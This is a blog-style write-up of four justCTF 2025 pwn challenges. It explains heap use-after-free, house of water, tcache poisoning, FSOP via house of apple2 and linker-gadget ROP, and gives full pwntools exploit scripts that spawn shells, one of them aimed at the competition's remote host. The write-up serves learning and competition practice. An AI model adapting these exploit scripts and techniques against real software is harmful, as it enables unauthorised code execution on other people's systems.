---
date: 2025-08-04 10:21:59
layout: post
title: justCTF 2025 writeup
subtitle: 
description: >-
    
image: >-
  /assets/img/uploads/bird.jpg
optimized_image: >-
  /assets/img/uploads/bird.jpg
category: half-finished
tags:
  - heap challenges
  - strace
  - justCTF 2025
  - FSOP
author: rosayxy
paginate: true
---

played justCTF 2025 with Blue Water, and had a great time! below are the writeups for four of the challenges I solved for pwn (some are done with teammates lol)

## babyheap
this is just a normal heap challenge. We can do `malloc(0x30)` for chunks, delete them, show their contents and update their contents.

The vulnerability is a heap UAF, very typical.

### libc leak
we can note that, UAF for tcache-size chunks naturally leads to a heap leak and arbitrary alloc (arbitrary write) on heap, and now comes the problem of how we can leak the libc address.

Our solution is to use the arbitrary alloc to overwrite the size of a victim chunk to a size that can be put into unsorted bin, then we arbitrary alloc again to set up its "footer", which is the header of the next chunk and the header of the next-next chunk somewhere in the top chunk, and we free the victim chunk. It will be put into unsorted bin, and we can leak the libc addresses from its fd and bk.

(In the discord channel, someone asked about whether to fake two headers that is glibc needs to check the chunk at the end of the fake chunk that whether it is freed or not, if it is freed, glibc then considers whether we should merge the two chunks (in case the chunk right after is in unsorted bin)), so we need to fake the header of the next-next chunk, to tell glibc that the chunk right after the fake chunk is not freed.

By the way, some shifu in the discord channel of this CTF got libc address on heap by sending a big num to the `__isoc99_scanf("%d", &v4)` function, which causes a heap allocation of over 0x400 bytes.

### house of water

[house of water](https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c) is a trick to abuse the tcache metadata, which is the `tcache_perthread_struct`, we can first alloc a chunk to overwrite the 0x40-sized tcache entry for our target addresses, then each time we malloc(0x30), a chunk at the target address will be returned. Also, we can rewrite the tcache entry pointer for multiple times, which makes it easier for us to do arbitrary alloc, saving the trouble of playing tcache poisoning.

### further exploit

With the libc leak, now we can do arbitrary alloc anywhere in memory due to the house of water technique, so we arbitrary alloc to libc's environ and leak the stack address.

Then we arbitrary alloc to stack and write ROP to the return address of main, thus finishing the exploit

### exp
credit to teammate UDP for the template of this exploit

```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./babyheap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

context(arch='amd64', os='linux', log_level='debug')

# p = process(elf.path)
p = remote("baby-heap.nc.jctf.pro", 1337)

def menu():
    return p.recvuntil(b'> ')

def malloc(idx, data = b''):
    p.sendline(b'1')
    p.sendlineafter(b'Index? ', str(idx).encode())
    p.sendlineafter(b'Content? Content? ', data)
    return menu()

def read(idx):
    p.sendline(b'2')
    p.sendlineafter(b'Index? ', str(idx).encode())
    data = p.recvuntil(b'Menu:')[:-5]
    menu()
    return data

def update(idx, data):
    p.sendline(b'3')
    p.sendlineafter(b'Index? ', str(idx).encode())
    p.sendlineafter(b'Content? ', data)
    return menu()

def free(idx):
    p.sendline(b'4')
    p.sendlineafter(b'Index? ', str(idx).encode())
    return menu()

def rosa_read(idx):
    p.sendline(b'2')
    p.sendlineafter(b'Index? ', str(idx).encode())

menu()

malloc(19)
free(19)
leak = int(read(19)[:5][::-1].hex()+'000', 16)
log.info(f'heap Leak: {hex(leak)}')

# start to do tcache poisoning
# do arb write twice for fake chunk
malloc(18, b"enlarge the tcache counts")
malloc(17, b"enlarge the tcache counts1")
malloc(16, b"enlarge the tcache counts2")

malloc(0, b"a"*0x10)
malloc(1, b"b"*0x10)
malloc(2, b"c"*0x10)


free(18)
free(17)
free(16)

free(0)

free(1)
free(2)
target = leak + 0xa0
fake_fd = target^(target//0x1000)

update(2, p64(fake_fd) + b'\x00'*0x10)

malloc(3, b"a"*0x10)
malloc(4, p64(leak + 0x310))

malloc(5, p64(0) + p64(0x501))

update(4, p64(leak + 0x810))

malloc(6, p64(0) + p64(0x21) + p64(0)*2 + p64(0) + p64(0x21))

free(16)

rosa_read(16)
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc_leak - 0x203b20
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc_base))

menu()
environ_addr = libc_base + libc.symbols['environ'] - 0x18

update(4, p64(environ_addr))
malloc(7)
rosa_read(7)

leaks = p.recv(0x20)
environ_addr = u64(leaks[0x18: 0x24].ljust(8, b'\x00'))
log.info("environ leak: " + hex(environ_addr))
# 0x7fff02f44b78 0x7fff02f44ca8
ret_addr = environ_addr - 0x130 - 0x8

pop_rdi_ret = libc_base + 0x10f75b
binshell_addr = libc_base + 0x1cb42f
system_addr = libc_base + libc.symbols['system']
ret = libc_base + 0x40769
# gdb.attach(p)
# pause()
update(4, p64(ret_addr))
malloc(8, p64(ret_addr) + p64(ret) + p64(pop_rdi_ret) + p64(binshell_addr) + p64(system_addr))
menu()
p.sendline("0")

p.interactive()

```

## shellcode printer

It mmaps a rwx permission memory, and we can write shellcode to it using the format string vulnerability, then the program will execute the shellcode.

the only thing to mind is that the address it will start executing the shellcode is the last two bytes of it, so we need to append a `jmp -48` to the end of the shellcode, which will jump to the start of the shellcode for execution.

### exp

```py
from pwn import *
context(arch = "amd64", os = "linux", log_level = "debug")
p = process("./shellcode_printer")
shellcode = shellcraft.sh()
shellcode = asm(shellcode).decode("latin-1")
log.info(f"Shellcode length: {len(shellcode)}")
print(shellcode)
# gdb.attach(p)
# pause()
for i in range(0, len(shellcode), 2):
    value = shellcode[i:i+2]
    num = ord(value[0]) + (ord(value[1]) << 8)
    p.recvuntil("Enter a format string: ")
    p.sendline(f"%{num}c%6$hn")


p.recvuntil("Enter a format string: ")
p.sendline("%52971c%6$hn")  # \xeb\xce for the jmp -48 to jump to the start of our shellcode
p.recvuntil("Enter a format string: ")
p.sendline("\x00")
p.interactive()
```

## jctfcoin

Get flag with (probably) an unintended method with teammate UDP lol.

Our vulnerability lies in that we can have a 0x10 bytes overflow on the heap. However, the difficult thing is that we can only leak the first 0x8 bytes of the chunk, which is in the following structure:

```c
struct User {
    size_t balance;
    size_t name_len;
    char name[];
}
```
So the leak is a bit dirty, and thanks for teammate for the heap leak and code template.

The main technique to use is still to overwrite the size of the next chunk and construct chunk overlapping. For the libc leak, we overwrite a chunk's size to something big enough to be put into unsorted bin, then we malloc an appropriate size from the unsorted bin chunk to let its fd and bk overlap with the first 0x10 bytes of the next chunk, when we call the show function, we can leak the fd address.

Then we malloc 0x50, the chunk will **completely overlap with a previously allocated chunk**, when we free it, it will write the tcache fd to its first 0x8 bytes, and we can leak from it.

the overall layout of the heap

![alt_text](/assets/img/uploads/jctfcoin.jpg)

The following steps are quite natural, we do tcache poisoning with the overflow, alloc to `IO_list_all` and play house of apple2 to get shell.

### exp

```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./jctfcoin")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

context(arch='amd64', os='linux', log_level='debug')

# p = remote("jctfcoin.nc.jctf.pro", 1337)
p = process(elf.path)

def menu():
    return p.recvuntil(b'Give me your command: ')


def new_user(idx, name, name_len=None):
    if name_len == None:
        name_len = len(name)

    p.sendline(b'1')
    p.sendlineafter(b'Enter user index: ', str(idx).encode())
    p.sendlineafter(b'Enter user name length: ', str(name_len).encode())
    p.sendlineafter(b'Enter user name: ', name)
    
    return menu()

def view(idx):
    p.sendline(b'2')
    p.sendlineafter(b'Enter user index: ', str(idx).encode())
    p.recvuntil(b'User balance: ')
    res = int(p.recvuntil(b' jCTFcoins')[:-10])
    menu()
    return res


def rename(idx, name):
    p.sendline(b'3')
    p.sendlineafter(b'Enter user index: ', str(idx).encode())
    p.sendlineafter(b'Enter new name: ', name)
    return menu()


def rm(idx):
    p.sendline(b'4')
    p.sendlineafter(b'Enter user index: ', str(idx).encode())
    return menu()


def mine(idx, amnt, desc, desc_len=None):
    if desc_len == None:
        desc_len = len(desc)

    p.sendline(b'5')

    p.sendlineafter(b'Enter user index: ', str(idx).encode())
    p.sendlineafter(b'Enter amount to mine: ', str(amnt).encode())
    p.sendlineafter(b'Enter description length: ', str(desc_len).encode())
    p.sendlineafter(b'Enter description: ', desc)

    return menu()

new_user(1, b"B"*0x130) # Needs to be small to overwrite size of next chunk
new_user(2, b"C"*0x130) # Needs to be small to reach the amount of next chunk
new_user(3, b"D"*0x200) # Padding
new_user(4, b"E"*0x200) # Padding
new_user(5, b"F"*0x100) # Padding
new_user(6, b"G"*0x140) # Padding

new_user(10, b"a"*0x200)

rename(1, b"?"*0x138+p64(0x6b1))
rm(2)

new_user(7, b'H'*0x130)
libc_leak = view(3)
gdb.attach(p)
pause()
print("libc: "+hex(libc_leak))
libc_base = libc_leak - 0x203b20

new_user(8, b'X'*0x40)
rm(8)

heap_leak = view(3)<<12
print("heap: "+hex(heap_leak))

# constructing IO_file

io_list_all = libc_base + 0x2044b0

fake_io_addr = heap_leak + 0x270 # TODO
system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x205700)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)
# stuff the fake io somewhere

rename(1, fake_io_file)

rm(10)
rm(4)
new_user(10, b"x"*0x120) # 0x140 大小的 alloc
new_user(11, b"b"*0x60 + p64(0) + p64(0x221) + p64(io_list_all^(heap_leak //0x1000))+b"t"*0x20)
new_user(4, "get it out", 0x200)
new_user(12, p64(fake_io_addr) , 0x200)

p.sendline("6")
# do tcache poisoning

p.interactive()
```

## prospector

A stack challenge. The only fun thing is that the address to leak is the mmaped address, and we can calculate the base of the linker. All of the gadgets we need are in the linker.

When debugging the rop chain, the problem I encountered is as follows. I want to call the sys_execve, and the rdi, rsi, rdx arguments each stands for file name, argv and envp respectively. At first, I passed the pointer to the string "/bin/sh" as argv, but it results in EFAULT at sys_execve.

I was miffed, but luckily, my boyfriend was nearby lol and he suggested looking at the parameters with `strace`, like `strace -o strace.log ./prospector`

It shows the following message
```
execve("/bin/sh", [0x68732f6e69622f, 0x7be1000055b63fda, 0x1f6b], NULL) = -1 EFAULT (Bad address)
```

Thus I realized the address I passed as argv should be a pointer to a pointer pointing to the string "/bin/sh" literal lol

### exp

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process("strace -o strace.log ./prospector".split(" "))
#gdb.attach(p)
#pause()
p.recvuntil("Nick")
p.send("a"*0x48 + "\x01") # can leak here
p.recvuntil("score: ")
score = p.recvline().strip(b"\n").strip()
score = int(score)
log.info("Leaked score: " + str(score))

mmap_addr = (score//2)*0x10000 + 0x700000000000
ld_addr = mmap_addr - 0x37000 # TODO
log.info("Mmap address: " + hex(mmap_addr))
pop_rdi_ret = 0x351e + ld_addr
pop_rsi_ret = 0x54da + ld_addr
pop_rax_rdx_rbx_ret = 0x20322 + ld_addr
syscall = ld_addr + 0xcbc6
p.recvuntil("Nick: ")
p.send(b"a" +b"\x00"*0x27 + p64(mmap_addr) + p64(0) + p64(pop_rdi_ret) + p64(mmap_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rax_rdx_rbx_ret) + p64(59) + p64(0)*2 + p64(syscall))
p.recvuntil("Color: ")
p.send("aa/bin/sh\x00")
p.interactive()
```

## TODO - Tape

a really nasty challenge that requires you to dig up FSOP chains manually, and it has loads of restrictions

Because the vtable and wide_data vtables are not modifiable, I think about triggering the house of apple3 path with codecvt somewhere, but was too tired to complete it during the CTF.

Will solve it sometime this week or next week and update this writeup

btw, teammate tried digging up chains with angr, which is real cool, just like [this](https://blog.kylebot.net/2022/10/22/angry-FSROP/)

however, I resolve to do it manually, because I think I've used angr enough in my life, and it is somewhat a pain to use, sad


